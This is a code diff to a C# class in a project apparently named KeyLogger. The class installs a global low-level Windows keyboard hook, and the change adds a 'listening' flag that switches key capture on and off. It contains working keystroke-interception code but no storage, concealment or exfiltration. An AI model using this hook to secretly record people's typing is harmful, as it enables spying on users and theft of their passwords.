@@ -7,13 +7,13 @@ namespace KeyLogger
     /// <summary>
     /// Class for intercepting low level keyboard hooks
     /// </summary>
-    public class KeyboardHook
+    internal class KeyboardHook
     {
         /// <summary>
         /// Internal callback processing function
         /// </summary>
-        private delegate IntPtr KeyboardHookHandler(int nCode, IntPtr wParam, IntPtr lParam);
-        private KeyboardHookHandler hookHandler;
+        delegate IntPtr KeyboardHookHandler(int nCode, IntPtr wParam, IntPtr lParam);
+        KeyboardHookHandler hookHandler;
 
         /// <summary>
         /// Function that will be called when defined events occur
@@ -29,7 +29,10 @@ namespace KeyLogger
         /// <summary>
         /// Hook ID
         /// </summary>
-        private IntPtr hookID = IntPtr.Zero;
+        IntPtr hookID = IntPtr.Zero;
+
+        public bool listening = false;
+
 
         /// <summary>
         /// Install low level keyboard hook
@@ -53,7 +56,7 @@ namespace KeyLogger
         /// </summary>
         /// <param name="proc">Callback function</param>
         /// <returns>Hook ID</returns>
-        private IntPtr SetHook(KeyboardHookHandler proc)
+        IntPtr SetHook(KeyboardHookHandler proc)
         {
             using (ProcessModule module = Process.GetCurrentProcess().MainModule)
                 return SetWindowsHookEx(13, proc, GetModuleHandle(module.ModuleName), 0);
@@ -62,18 +65,22 @@ namespace KeyLogger
         /// <summary>
         /// Default hook call, which analyses pressed keys
         /// </summary>
-        private IntPtr HookFunc(int nCode, IntPtr wParam, IntPtr lParam)
+        IntPtr HookFunc(int nCode, IntPtr wParam, IntPtr lParam)
         {
-            if (nCode >= 0)
+            // Only process if listening
+            if (listening)
             {
-                int iwParam = wParam.ToInt32();
+                if (nCode >= 0)
+                {
+                    int iwParam = wParam.ToInt32();
 
-                if ((iwParam == WM_KEYDOWN || iwParam == WM_SYSKEYDOWN))
-                    KeyDown?.Invoke(KeyboardKeys.VKeys[Marshal.ReadInt32(lParam)]);
-                if ((iwParam == WM_KEYUP || iwParam == WM_SYSKEYUP))
-                    KeyUp?.Invoke(KeyboardKeys.VKeys[Marshal.ReadInt32(lParam)]);
+                    if ((iwParam == WM_KEYDOWN || iwParam == WM_SYSKEYDOWN))
+                        KeyDown?.Invoke(KeyboardKeys.VKeys[Marshal.ReadInt32(lParam)]);
+                    if ((iwParam == WM_KEYUP || iwParam == WM_SYSKEYUP))
+                        KeyUp?.Invoke(KeyboardKeys.VKeys[Marshal.ReadInt32(lParam)]);
+                }
             }
-
+            
             return CallNextHookEx(hookID, nCode, wParam, lParam);
         }
 
